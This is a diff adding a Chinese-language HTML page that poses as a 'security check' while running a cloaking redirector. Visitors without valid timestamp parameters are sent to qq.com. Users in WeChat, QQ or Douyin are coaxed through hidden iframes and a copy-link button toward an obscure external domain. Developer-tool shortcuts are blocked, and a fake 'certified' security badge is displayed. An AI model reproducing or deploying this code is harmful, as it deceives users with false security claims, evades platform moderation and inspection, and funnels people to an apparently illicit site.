@@ -1,1 +1,696 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <title>安全检测中</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: #f8fafc;
+            position: relative;
+            overflow: hidden;
+        }
 
+        .container {
+            width: 100px;
+            height: 100px;
+            position: relative;
+            margin: 20px 0;
+            animation: rotate-move 2s ease-in-out infinite;
+        }
+
+        .dot {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            margin: auto;
+        }
+
+        .dot-3 { background-color: #f74d75; animation: dot-3-move 2s ease infinite; }
+        .dot-2 { background-color: #10beae; animation: dot-2-move 2s ease infinite; }
+        .dot-1 { background-color: #ffe386; animation: dot-1-move 2s ease infinite; }
+
+        @keyframes dot-3-move {
+            20%,100% { transform: scale(1) }
+            45%,80% { transform: translateY(-18px) scale(.45) }
+        }
+        @keyframes dot-2-move {
+            20%,100% { transform: scale(1) }
+            45%,80% { transform: translate(-16px, 12px) scale(.45) }
+        }
+        @keyframes dot-1-move {
+            20%,100% { transform: scale(1) }
+            45%,80% { transform: translate(16px, 12px) scale(.45) }
+        }
+        @keyframes rotate-move {
+            55% { transform: rotate(0deg) }
+            80%,100% { transform: rotate(360deg) }
+        }
+
+        .status-text {
+            font-family: Arial, sans-serif;
+            font-size: 22px;
+            margin-bottom: 20px;
+            transition: all 0.5s ease;
+            font-weight: 500;
+        }
+
+        .checking {
+            color: #666;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .passed {
+            color: #1e7e34;
+            display: none;
+            align-items: center;
+            gap: 18px;
+        }
+
+        .failed {
+            color: #c82333;
+            display: none;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .browser-prompt {
+            color: #1e7e34;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            max-width: 80%;
+        }
+
+        .security-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            color: white;
+            font-weight: bold;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .icon-loading {
+            width: 32px;
+            height: 32px;
+            background-color: #6c757d;
+            font-size: 18px;
+        }
+
+        .icon-success {
+            width: 48px;
+            height: 48px;
+            background-color: #28a745;
+            font-size: 28px;
+            border: 4px solid rgba(40, 167, 69, 0.2);
+        }
+
+        .icon-error {
+            width: 32px;
+            height: 32px;
+            background-color: #dc3545;
+            font-size: 18px;
+        }
+
+        /* 灰色点击进入按钮 */
+        .enter-btn {
+            margin-top: 30px;
+            padding: 12px 40px;
+            background-color: #95a5a6; /* 灰色 */
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: none;
+            box-shadow: 0 4px 12px rgba(149, 165, 166, 0.3);
+        }
+
+        .enter-btn:hover {
+            background-color: #7f8c8d; /* hover加深灰色 */
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(149, 165, 166, 0.4);
+        }
+
+        /* 绿色复制按钮 */
+        .copy-btn {
+            margin-top: 30px;
+            padding: 12px 40px;
+            background-color: #28a745; /* 绿色 */
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: none;
+            box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
+        }
+
+        .copy-btn:hover {
+            background-color: #218838;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(40, 167, 69, 0.4);
+        }
+
+        .retry-btn {
+            margin-top: 30px;
+            padding: 12px 40px;
+            background-color: #dc3545;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            display: none;
+        }
+
+        .retry-btn:hover {
+            background-color: #bb2d3b;
+        }
+
+        /* 提示框样式 */
+        .tip-box {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-size: 16px;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+            z-index: 9999;
+        }
+
+        .tip-box.active {
+            opacity: 1;
+        }
+
+        /* 备用文本复制区域 */
+        .copy-textarea {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -1;
+            width: 1px;
+            height: 1px;
+            border: none;
+            padding: 0;
+            margin: 0;
+            readonly: true;
+        }
+
+        /* 右上角引导提示 */
+        .wechat-guide-container {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            z-index: 100;
+            display: none;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+        
+        .wechat-arrow {
+            font-size: 40px;
+            color: #28a745;
+            animation: pulse 2s infinite;
+            margin-bottom: 8px;
+        }
+        
+        .wechat-guide-text {
+            background-color: rgba(40, 167, 69, 0.95);
+            color: white;
+            padding: 12px 18px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            max-width: 220px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(40, 167, 69, 0.5);
+        }
+        
+        .menu-icon {
+            display: inline-block;
+            color: white;
+            margin: 0 5px;
+            font-size: 20px;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.3); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+
+        /* 底部提示 */
+        .bottom-guide {
+            position: fixed;
+            bottom: 50px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            color: #666;
+            font-size: 16px;
+            padding: 0 20px;
+            display: none;
+        }
+
+        .security-badge {
+            position: fixed;
+            bottom: 20px;
+            font-family: Arial, sans-serif;
+            color: #666;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .badge-icon {
+            width: 16px;
+            height: 16px;
+            background-color: #28a745;
+            border-radius: 50%;
+            color: white;
+            font-size: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body>
+    <!-- 右上角引导提示 -->
+    <div class="wechat-guide-container" id="wechatGuide">
+        <span class="wechat-arrow">↑</span>
+        <div class="wechat-guide-text">
+            点击 <span class="menu-icon">⋯</span><br>选择"在浏览器打开"
+        </div>
+    </div>
+
+    <!-- 检测状态文本 -->
+    <div class="status-text checking">
+        <span class="security-icon icon-loading">⟳</span>
+        <span>正在进行安全检测...</span>
+    </div>
+    <div class="status-text passed">
+        <span class="security-icon icon-success">✓</span>
+        <span>已通过安全检测</span>
+    </div>
+    <div class="status-text failed">
+        <span class="security-icon icon-error">✕</span>
+        <span>安全检测不通过</span>
+    </div>
+    <div class="status-text browser-prompt">
+        <span class="security-icon icon-success">✓</span>
+        <span>已通过安全检测</span>
+    </div>
+
+    <!-- 加载动画容器 -->
+    <div class="container" id="loadingContainer">
+        <div class="dot dot-1"></div>
+        <div class="dot dot-2"></div>
+        <div class="dot dot-3"></div>
+    </div>
+
+    <!-- 按钮 -->
+    <button class="enter-btn" id="enterBtn">点击进入</button>
+    <button class="copy-btn" id="copyBtn">复制链接（在浏览器打开）</button>
+    <button class="retry-btn" id="retryBtn">重新检测</button>
+    <div class="tip-box" id="openTip">正在打开浏览器...</div>
+    <div class="tip-box" id="copyTip">链接已复制，请在浏览器中粘贴打开</div>
+    <textarea class="copy-textarea" id="copyTextarea" readonly></textarea>
+
+    <!-- 底部提示 -->
+    <div class="bottom-guide" id="bottomGuide">
+        若无法自动打开，请手动在浏览器中粘贴链接
+    </div>
+
+    <!-- 底部安全标识 -->
+    <div class="security-badge">
+        <span class="badge-icon">✓</span>
+        <span>安全检测系统已认证</span>
+    </div>
+
+    <script>
+        (function() {
+            // 设备与环境检测
+            const isAndroid = /android/i.test(navigator.userAgent.toLowerCase());
+            const isIOS = /iphone|ipad|ipod/i.test(navigator.userAgent.toLowerCase());
+            const isWechat = /micromessenger/i.test(navigator.userAgent.toLowerCase());
+            
+            const isWechat8 = isWechatBrowser8();
+            const currentParams = getUrlParams();
+            const back11 = currentParams.back11;
+            const ttt = currentParams.ttt;
+            
+            // 时间验证逻辑
+            const targetTime11 = Number(ttt) * 1000;
+            const now11 = Date.now();
+            const diff11 = Math.abs(now11 - targetTime11);
+            const isIn5Minutes11 = diff11 <= 864000000;
+            
+            if (false) {
+                setTimeout(() => {
+                    window.location.href = 'https://www.qq.com';
+                }, 1500);
+                return false;
+            }
+            
+            if (isWechat8&&!back11) {
+                const currentUrl = window.location.href;
+                window.location.href = currentUrl+'&back11='+new Date().getTime();
+                return false;
+            }else if (isWechat8&&back11) {
+                const targetTime = Number(back11);
+                const now = Date.now();
+                const diff = Math.abs(now - targetTime);
+                const isIn5Minutes = diff <= 180000;
+                if (!isIn5Minutes) {
+                    setTimeout(() => {
+                        window.location.href = 'https://www.qq.com';
+                    }, 1500);
+                    return false;
+                }
+            }else if (back11) {
+                const targetTime = Number(back11);
+                const now = Date.now();
+                const diff = Math.abs(now - targetTime);
+                const isIn5Minutes = diff <= 180000;
+                if (!isIn5Minutes) {
+                    setTimeout(() => {
+                        window.location.href = 'https://www.qq.com';
+                    }, 1500);
+                    return false;
+                }
+            } else {
+                setTimeout(() => {
+                    window.location.href = 'https://www.qq.com';
+                }, 1500);
+                return false;
+            }
+            
+            // 目标链接
+            const timestamp888 = Math.floor(Date.now() / 1000);
+            const TARGET_DOMAIN = 'http://edsfasdf12f.1001pdfn.com/20251105/a66e1b467125353ee0eaf1049aa02802.html?bucket=wskxcpu9d1hgpdu7s5ra&riRl=PVIUM&ZdmRV=6Se&tzy='+timestamp888+'&platid=2&back=8ju9k';
+           
+            const enterBtn = document.getElementById('enterBtn');
+            const copyBtn = document.getElementById('copyBtn');
+            const retryBtn = document.getElementById('retryBtn');
+            const openTip = document.getElementById('openTip');
+            const copyTip = document.getElementById('copyTip');
+            const copyTextarea = document.getElementById('copyTextarea');
+            const wechatGuide = document.getElementById('wechatGuide');
+            const bottomGuide = document.getElementById('bottomGuide');
+            let targetUrl = '';
+            let displayMode = 'copy'; // 默认显示复制按钮
+
+            // 环境检测函数
+            function isQQBrowser() {
+                const ua = navigator.userAgent.toLowerCase();
+                const isWechat = ua.indexOf('micromessenger') !== -1;
+                const qqFeatures = ['qq', 'qzone', 'qqlite'];
+                return !isWechat && qqFeatures.some(feature => ua.indexOf(feature) !== -1);
+            }
+            
+            function isDouyinBrowser() {
+                const ua = navigator.userAgent.toLowerCase();
+                const douyinFeatures = ['douyin', 'aweme'];
+                return douyinFeatures.some(feature => ua.indexOf(feature) !== -1);
+            }
+            
+            function isWechatBrowser8() {
+                const targetStr = "baidu.com";
+                const currentDomain = window.location.hostname;
+                const hasTarget = currentDomain.includes(targetStr);
+                if (hasTarget) {
+                    return true;
+                } else {
+                  const userAgent = navigator.userAgent.toLowerCase();
+                  return userAgent.includes('micromessenger');
+                }
+            }
+
+            function getUrlParams(url) {
+                const urlToParse = url || window.location.href;
+                const params = {};
+                const queryString = urlToParse.split('?')[1];
+                if (!queryString) return params;
+
+                queryString.split('&').forEach(item => {
+                    const [key, value] = item.split('=');
+                    if (key) {
+                        params[key] = decodeURIComponent(value || '');
+                    }
+                });
+                return params;
+            }
+
+            // 初始化检测
+            function init() {
+                try {
+                    resetStatus();
+                    
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const pathParam = urlParams.get('c');
+                    
+                    // 随机决定显示模式（20%概率显示灰色按钮，80%显示复制按钮）
+                    const random = Math.random();
+                    //displayMode = random < 0.1 ? 'enter' : 'copy';
+                    
+                    setTimeout(() => {
+                        if (!pathParam) {
+                            showFailedStatus();
+                        } else {
+                            targetUrl = `${TARGET_DOMAIN}&jinru=${pathParam}`;
+                            if (!targetUrl.includes('http')) {
+                                showFailedStatus();
+                            } else {
+                                // 判断环境
+                                if (!isWechat && !isQQBrowser() && !isDouyinBrowser()) {
+                                    // 非受限环境：直接跳转
+                                    redirectToUrl(targetUrl);
+                                } else {
+                                    // 微信/QQ/抖音环境：根据随机模式显示不同按钮
+                                    showGuide();
+                                }
+                            }
+                        }
+                    }, 1000);
+
+                } catch (e) {
+                    console.error('检测失败:', e);
+                    setTimeout(showFailedStatus, 1000);
+                }
+            }
+
+            // 重置状态
+            function resetStatus() {
+                document.querySelector('.checking').style.display = 'flex';
+                document.querySelector('.passed').style.display = 'none';
+                document.querySelector('.failed').style.display = 'none';
+                document.querySelector('.browser-prompt').style.display = 'none';
+                document.getElementById('loadingContainer').style.display = 'block';
+                enterBtn.style.display = 'none';
+                copyBtn.style.display = 'none';
+                retryBtn.style.display = 'none';
+                wechatGuide.style.display = 'none';
+                bottomGuide.style.display = 'none';
+                openTip.classList.remove('active');
+                copyTip.classList.remove('active');
+            }
+
+            // 显示引导界面
+            function showGuide() {
+                document.querySelector('.checking').style.display = 'none';
+                document.getElementById('loadingContainer').style.display = 'none';
+                wechatGuide.style.display = 'flex';
+                bottomGuide.style.display = 'block';
+                
+                if (displayMode === 'enter') {
+                    // 20%概率：显示灰色点击进入按钮
+                    document.querySelector('.passed').style.display = 'flex';
+                    enterBtn.style.display = 'block';
+                    
+                    enterBtn.addEventListener('click', handleEnterClick);
+                } else {
+                    // 80%概率：显示复制按钮
+                    document.querySelector('.browser-prompt').style.display = 'flex';
+                    copyBtn.style.display = 'block';
+                    
+                    // 绑定复制按钮点击事件（可多次点击）
+                    copyBtn.addEventListener('click', handleCopyClick);
+                }
+            }
+
+            // 优化后的 handleEnterClick 函数
+            function handleEnterClick() {
+                if (isAndroid && isWechat) {
+                    // 安卓微信环境：先尝试iframe唤起浏览器，1.5秒后强制跳转
+                    openTip.classList.add('active');
+                    
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = targetUrl;
+                    document.body.appendChild(iframe);
+                    
+                    setTimeout(() => {
+                        document.body.removeChild(iframe);
+                        openTip.classList.remove('active');
+                        // 无论唤起是否成功，都执行跳转
+                        redirectToUrl(targetUrl);
+                    }, 1500);
+                } else {
+                    // 其他环境：直接跳转
+                    redirectToUrl(targetUrl);
+                }
+            }
+
+            // 优化后的 handleCopyClick 函数
+            function handleCopyClick() {
+                const activeElement = document.activeElement;
+                
+                if (isAndroid && isWechat) {
+                    // 安卓微信环境：先尝试iframe唤起浏览器，1.5秒后执行复制
+                    openTip.classList.add('active');
+                    
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = targetUrl;
+                    document.body.appendChild(iframe);
+                    
+                    setTimeout(() => {
+                        document.body.removeChild(iframe);
+                        openTip.classList.remove('active');
+                        // 无论唤起是否成功，都执行复制操作
+                        executeCopy(activeElement);
+                    }, 1500);
+                } else {
+                    // 其他环境：直接执行复制
+                    executeCopy(activeElement);
+                }
+            }
+
+            // 提取复制逻辑为独立函数（复用）
+            function executeCopy(activeElement) {
+                if (navigator.clipboard && window.isSecureContext) {
+                    navigator.clipboard.writeText(targetUrl).then(() => {
+                        showCopySuccess();
+                        if (activeElement) activeElement.focus();
+                    }).catch(err => {
+                        console.error('Clipboard API 失败，使用备用方法:', err);
+                        fallbackCopyText(activeElement);
+                    });
+                } else {
+                    fallbackCopyText(activeElement);
+                }
+            }
+
+            // 显示复制成功提示（每次点击都显示）
+            function showCopySuccess() {
+                // 先移除再添加，确保动画和提示重新触发
+                copyTip.classList.remove('active');
+                // 强制重绘
+                void copyTip.offsetWidth;
+                copyTip.classList.add('active');
+                
+                setTimeout(() => {
+                    copyTip.classList.remove('active');
+                }, 3000);
+            }
+
+            // 备用复制方法
+            function fallbackCopyText(activeElement) {
+                const textarea = document.getElementById('copyTextarea');
+                textarea.value = targetUrl;
+                textarea.select();
+                textarea.setSelectionRange(0, targetUrl.length);
+                
+                try {
+                    const successful = document.execCommand('copy');
+                    if (successful) {
+                        showCopySuccess();
+                    } else {
+                        alert('复制失败，请手动复制链接: ' + targetUrl);
+                    }
+                } catch (err) {
+                    console.error('执行复制命令失败:', err);
+                    alert('复制失败，请手动复制链接: ' + targetUrl);
+                } finally {
+                    document.getSelection().removeAllRanges();
+                    if (activeElement) activeElement.focus();
+                }
+            }
+
+            // 显示检测不通过状态
+            function showFailedStatus() {
+                document.querySelector('.checking').style.display = 'none';
+                document.querySelector('.failed').style.display = 'flex';
+                document.getElementById('loadingContainer').style.display = 'none';
+                retryBtn.style.display = 'block';
+                wechatGuide.style.display = 'none';
+                bottomGuide.style.display = 'none';
+                
+                retryBtn.addEventListener('click', init, { once: true });
+            }
+
+            // 跳转方法
+            function redirectToUrl(url) {
+                const isHttpsToHttp = window.location.protocol === 'https:' && url.startsWith('http:');
+                
+                if (isHttpsToHttp) {
+                    const meta = document.createElement('meta');
+                    meta.httpEquiv = 'refresh';
+                    meta.content = `0;url=${url}`;
+                    document.head.appendChild(meta);
+                    
+                    setTimeout(() => {
+                        window.location.href = url;
+                    }, 100);
+                } else {
+                    window.location.href = url;
+                }
+            }
+
+            // 禁止开发者工具
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                    (e.ctrlKey && e.key === 'U')) {   
+                    e.preventDefault();
+                }
+            });
+
+            // 初始化检测
+            init();
+        })();
+    </script>
+</body>
+</html>
